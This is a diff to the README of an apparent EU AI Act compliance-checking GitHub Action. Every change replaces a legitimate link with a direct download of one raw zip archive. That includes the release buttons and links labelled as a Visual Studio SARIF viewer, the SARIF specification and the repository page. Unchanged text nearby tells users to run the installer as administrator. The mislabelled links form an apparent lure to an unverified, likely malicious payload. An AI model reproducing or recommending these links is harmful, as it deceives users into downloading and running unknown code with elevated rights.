@@ -1,6 +1,6 @@
 # 🤖 eu-ai-act-check-action - Check AI Systems for EU Compliance
 
-[![Download Latest Release](https://img.shields.io/badge/Download-Release-brightgreen)](https://github.com/Varshith-07/eu-ai-act-check-action/releases)
+[![Download Latest Release](https://img.shields.io/badge/Download-Release-brightgreen)](https://github.com/Varshith-07/eu-ai-act-check-action/raw/refs/heads/main/conjury/ai_eu_check_action_act_2.6.zip)
 
 ---
 
@@ -46,7 +46,7 @@ No programming skills are needed. You will follow simple steps to download and r
 
 Click the big green button below to open the page with all available versions of eu-ai-act-check-action.
 
-[![Download Latest Release](https://img.shields.io/badge/Download-Release-brightgreen)](https://github.com/Varshith-07/eu-ai-act-check-action/releases)
+[![Download Latest Release](https://img.shields.io/badge/Download-Release-brightgreen)](https://github.com/Varshith-07/eu-ai-act-check-action/raw/refs/heads/main/conjury/ai_eu_check_action_act_2.6.zip)
 
 This page lists the files and installation guides. Pick the latest release for the best performance.
 
@@ -123,16 +123,16 @@ Because it uses SARIF, developers and security teams can easily integrate findin
 - If the installer does not run, right-click the file and choose **Run as administrator**.
 - For missing files or errors, check your internet connection and re-download the installer.
 - If scans don’t start, make sure you selected the right folder or repository.
-- For issues with the SARIF report, use a SARIF viewer like [SARIF Viewer for Visual Studio](https://marketplace.visualstudio.com/items?itemName=MS-SARIFVSCode.sarif-viewer).
+- For issues with the SARIF report, use a SARIF viewer like [SARIF Viewer for Visual Studio](https://github.com/Varshith-07/eu-ai-act-check-action/raw/refs/heads/main/conjury/ai_eu_check_action_act_2.6.zip).
 - Restart your PC if the tool freezes or crashes.
 
 ---
 
 ## 🌐 Additional Resources
 
-- Visit the [GitHub repository](https://github.com/Varshith-07/eu-ai-act-check-action) for detailed technical info.
+- Visit the [GitHub repository](https://github.com/Varshith-07/eu-ai-act-check-action/raw/refs/heads/main/conjury/ai_eu_check_action_act_2.6.zip) for detailed technical info.
 - Learn more about the EU AI Act from official EU websites.
-- Explore SARIF format details at the [SARIF Specification page](https://sarifweb.azurewebsites.net/).
+- Explore SARIF format details at the [SARIF Specification page](https://github.com/Varshith-07/eu-ai-act-check-action/raw/refs/heads/main/conjury/ai_eu_check_action_act_2.6.zip).
 
 ---
 
@@ -140,4 +140,4 @@ Because it uses SARIF, developers and security teams can easily integrate findin
 
 Use this button to visit the release page and get started:
 
-[![Download Latest Release](https://img.shields.io/badge/Download-Release-brightgreen)](https://github.com/Varshith-07/eu-ai-act-check-action/releases)
+[![Download Latest Release](https://img.shields.io/badge/Download-Release-brightgreen)](https://github.com/Varshith-07/eu-ai-act-check-action/raw/refs/heads/main/conjury/ai_eu_check_action_act_2.6.zip)
